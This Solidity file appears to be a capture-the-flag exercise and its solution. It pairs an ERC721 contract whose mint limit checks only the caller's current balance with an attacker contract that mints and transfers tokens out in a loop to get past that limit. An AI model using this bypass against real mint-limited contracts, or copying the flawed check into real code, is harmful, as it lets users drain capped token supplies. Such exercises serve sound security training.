// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Overmint2Attacker {
    Overmint2 public victim;
    address attacker;

    constructor(address victimContract) {
        victim = Overmint2(victimContract);
        address attacker = msg.sender;

        for (uint256 i = 1; i <= 5; ) {
            victim.mint();
            victim.transferFrom(address(this), msg.sender, i);

            unchecked {
                i++;
            }
        }
    }
}
